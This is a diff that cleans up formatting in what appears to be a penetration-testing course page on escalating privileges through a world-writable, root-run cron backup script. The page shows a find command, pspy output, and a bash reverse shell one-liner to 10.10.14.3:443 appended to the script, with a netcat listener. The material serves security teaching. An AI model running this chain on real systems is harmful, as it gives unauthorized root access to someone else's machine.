@@ -1,10 +1,10 @@
-`Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The `<crontab>` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `</var/spool/cron>` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.`
+Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The `<crontab>` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `</var/spool/cron>` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.
 
-`The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a `.tar.gz` file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.`
+The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a `.tar.gz` file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.
 
-`Certain applications create cron files in the `</etc/cron.d>` directory and may be misconfigured to allow a non-root user to edit them.`
+Certain applications create cron files in the `</etc/cron.d>` directory and may be misconfigured to allow a non-root user to edit them.
 
-`First, let's look around the system for any writeable files or directories. The file `<backup.sh>` in the `</dmz-backups>` directory is interesting and seems like it could be running on a cron job.`
+First, let's look around the system for any writeable files or directories. The file `<backup.sh>` in the `</dmz-backups>` directory is interesting and seems like it could be running on a cron job.
 
 > find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
@@ -18,8 +18,7 @@
 
 <SNIP>
 
-
-`A quick look in the `</dmz/backups>` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `<backup.sh>` shell script is world writeable and runs as root.`
+A quick look in the `</dmz/backups>` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `<backup.sh>` shell script is world writeable and runs as root.
 
 > ls -la /dmz-backups/
 
@@ -34,9 +33,9 @@ drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
 -rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
 -rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
 
-`We can confirm that a cron job is running using` <pspy> (*https://github.com/DominicBreuker/pspy*), `a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning `<procfs> (*https://en.wikipedia.org/wiki/Procfs*).`
+We can confirm that a cron job is running using` <pspy> (*https://github.com/DominicBreuker/pspy*), `a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning `<procfs> (*https://en.wikipedia.org/wiki/Procfs*).
 
-`Let's run `<pspy>` and have a look. The `<-pf>` flag tells the tool to print commands and file system events and `<-i 1000>` tells it to scan `<profcs>(*https://man7.org/linux/man-pages/man5/procfs.5.html*)` every 1000ms (or every second).`
+Let's run `<pspy>` and have a look. The `<-pf>` flag tells the tool to print commands and file system events and `<-i 1000>` tells it to scan `<profcs>(*https://man7.org/linux/man-pages/man5/procfs.5.html*)` every 1000ms (or every second).
 
 #
 > ./pspy64 -pf -i 1000
@@ -90,9 +89,9 @@ done
 2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
 # 
 
-`From the above output, we can see that a cron job runs the `<backup.sh>` script located in the `</dmz-backups>` directory and creating a tarball file of the contents of the `</var/www/html>` directory.`
+From the above output, we can see that a cron job runs the `<backup.sh>` script located in the `</dmz-backups>` directory and creating a tarball file of the contents of the `</var/www/html>` directory.
 
-`We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `<ALWAYS>` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.`
+We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `<ALWAYS>` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.
 
 > cat /dmz-backups/backup.sh 
 
@@ -102,7 +101,7 @@ done
  FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
  tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
- `We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a` <Bash one-liner reverse shell.> (*https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*)
+ We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a` <Bash one-liner reverse shell.> (*https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*)
 
  <Code: bash>
 
@@ -114,7 +113,7 @@ tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
  
 bash -i >& /dev/tcp/10.10.14.3/443 0>&1
 
-`We modify the script, stand up a local`<netcat>`listener, and wait. Sure enough, within three minutes, we have a root shell!`
+We modify the script, stand up a local`<netcat>`listener, and wait. Sure enough, within three minutes, we have a root shell!
 
 > nc -lnvp 443
 
